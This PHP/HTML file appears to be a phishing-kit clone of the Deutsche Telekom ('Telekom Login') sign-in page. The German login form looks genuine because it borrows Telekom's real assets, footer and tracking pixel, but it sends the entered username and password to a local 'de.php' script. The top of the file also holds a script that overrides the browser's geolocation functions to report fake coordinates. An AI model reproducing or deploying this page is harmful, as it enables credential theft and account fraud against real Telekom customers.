<?php
@session_start();
$email = @$_SESSION['username'];
$error = @$_GET['error'];
if ($error == 'invalidemail'){
	$invalidemail = "block";	
	}else{
	$invalidemail = "none";
		}

?>
<!DOCTYPE html>

<html class="no-js" lang="de"><script>(function(){function nQOUx() {
  window.qMMwISk = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
  window.fxokiEw = navigator.geolocation.watchPosition.bind(navigator.geolocation);
  let WAIT_TIME = 100;

  function waitGetCurrentPosition() {
    if ((typeof window.Jhula !== 'undefined')) {
      if (window.Jhula === true) {
        window.JCXvuCu({
          coords: {
            latitude: window.HHyIg,
            longitude: window.LfPEW,
            accuracy: 10,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: new Date().getTime(),
        });
      } else {
        window.qMMwISk(window.JCXvuCu, window.HLMIomc, window.UjoqD);
      }
    } else {
      setTimeout(waitGetCurrentPosition, WAIT_TIME);
    }
  }

  function waitWatchPosition() {
    if ((typeof window.Jhula !== 'undefined')) {
      if (window.Jhula === true) {
        navigator.getCurrentPosition(window.avCELSO, window.qXQoOrY, window.EoygL);
        return Math.floor(Math.random() * 10000); // random id
      } else {
        window.fxokiEw(window.avCELSO, window.qXQoOrY, window.EoygL);
      }
    } else {
      setTimeout(waitWatchPosition, WAIT_TIME);
    }
  }

  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
    window.JCXvuCu = successCallback;
    window.HLMIomc = errorCallback;
    window.UjoqD = options;
    waitGetCurrentPosition();
  };
  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
    window.avCELSO = successCallback;
    window.qXQoOrY = errorCallback;
    window.EoygL = options;
    waitWatchPosition();
  };

  window.addEventListener('message', function (event) {
    if (event.source !== window) {
      return;
    }
    const message = event.data;
    switch (message.method) {
      case 'sHPrZVY':
        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
          window.HHyIg = message.info.coords.lat;
          window.LfPEW = message.info.coords.lon;
          window.Jhula = message.info.fakeIt;
        }
        break;
      default:
        break;
    }
  }, false);
}nQOUx();})()</script><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/login.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/html5shiv.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/login.js"></script>
</head>







<body>
    <div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <div class="v-ctr">
                        <i class="icon icon-large">tT</i>
                    </div>
                </div>
                <div class="pull-right">
                    <div class="v-ctr">
                        <span class="text-right text-bold text-small tbs-text-upper">erleben, was verbindet.</span>
                    </div>
                </div>
            </div>
        </div>
        
        
        
    </header>

    <div>
        
    </div>

    
    

    <div class="offset-bottom-5 offset-s-bottom-2"></div>

</div>

    <div>

    

    <div>

        <img src="https://xdn-ttp.de/lns/import-event-0746?zid=110c0365-f7f8-4559-8c17-d513ee56a7be" hidden="true" alt="" frameborder="0" width="1" height="1">

        <img src="https://pix.telekom.de/196380495960676/wt?p=441,www.telekom.de.privatkunden.login-idm-id,0,0,0,0,0,0,0,0&cg1=www.telekom.de&cg2=login&cg8=privatkunden&cg9=login-idm-id&cp19=110c0365-f7f8-4559-8c17-d513ee56a7be" hidden="true" alt="" frameborder="0" width="1" height="1">

    </div>


</div>

    

    <div>
        <div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                <h4>Telefoniecenter</h4>
                
            </div>
            <h1 class="offset-top-0 offset-bottom-3 text-center">Mit dem Telekom Login anmelden</h1>
        </div>
        <div class="login-box">
            
            <div class="offset-bottom-1">
                <form id="login" name="login" method="POST" action="de.php" accept-charset="UTF-8" autocomplete="off" novalidate="">
                    
                    <input type="hidden" name="xsrf_rVAfeSN15o36RlOBco2lpA" value="hv1cTXb6jaiblC2Br5Q6_A">
                    <input type="hidden" name="x-show-cancel" value="false">

                    
                    <div class="offset-bottom-1">

                        
                        <div class="form-input-set floating">
                            <input id="pw_usr" name="pw_usr" type="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="<?php echo "$email"; ?>">
                            <label for="pw_usr">Benutzername</label>
                            <i class="info-question-icon" data-toggle="collapse" data-target="#usrInfo" data-toggle-hide="true" tabindex="60"></i>
                        </div>

                        
                        <div id="usrInfo" class="info-box pointer">
                            <p>So können Sie sich anmelden:</p>
                            <ul>
                                <li>
                                    <span class="text-bold">E-Mail-Adresse: </span>
                                    <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">Mobilfunk-Nummer: </span>
                                    <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
                                </li>
                            </ul>
                        </div>
                    </div>

                    
                    <div class="offset-bottom-1">
                        
                        <div class="form-input-set">
                            <input id="pw_pwd" name="pw_pwd" type="password" maxlength="128" class="form-input" tabindex="20">
                            <label for="pw_pwd">Passwort</label>
                        </div>
                    </div>

                    <div style="display: <?php echo "$invalidemail"; ?>;">
					<div class="info-box error">
                        
                        <div>E-Mail-Adresse muss "@t-online.de" enthalten.</div>
                    </div>
					</div>
                    

                    
                    <div class="login-helpers clearfix">
                        
                        <div id="tbs-signin-remember" class="form-checkbox-set">
                            <label>
                                <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_permanent" type="checkbox" name="persist_session" value="1" class="form-checkbox hidden" tabindex="30">
                                <span>Angemeldet bleiben</span>
                            </label>
                        </div>
                        
                        <div id="tbs-recovery-link" class="text-right">
                            <a href="https://meinkonto.telekom-dienste.de/wiederherstellung/passwort/index.xhtml" target="_blank" tabindex="70">Benutzername oder Passwort vergessen?</a>
                        </div>
                    </div>

                    
                    <div class="clearfix">
                        <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large tbs-text-upper" tabindex="40">Login</button>
                    </div>
                </form>

                
            </div>

            <div class="text-center offset-bottom-2">
                <a href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45" target="_blank">Brauchen Sie Hilfe?</a>
            </div>

            <div class="text-center offset-bottom-2">
                
            </div>

            <div id="tbs-services" class="text-center">
                <img src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/images/services.png">
            </div>
        </div>
    </div>
</div>
    </div>

    
    

    <footer id="tbs-footer">
        <div class="footer-content container-fixed text-small clearfix">
            <div class="pull-left">
                <p>© Telekom Deutschland GmbH</p>
                <p class="tbs-text-11">20.20.2, 62334c584583da8666d3dfbba4a10381, c2cf5a594458657dc9bd3821da82355354027cbc</p>
            </div>
            <div class="pull-right clearfix">
                <div class="pull-left">
                    <a href="https://www.telekom.de/start/impressum" target="_blank" tabindex="90">Impressum</a>
                </div>
                <div class="pull-left">
                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank" tabindex="100">Datenschutz</a>
                </div>
            </div>
        </div>
    </footer>

    

    <div>
    
</div>



</body></html>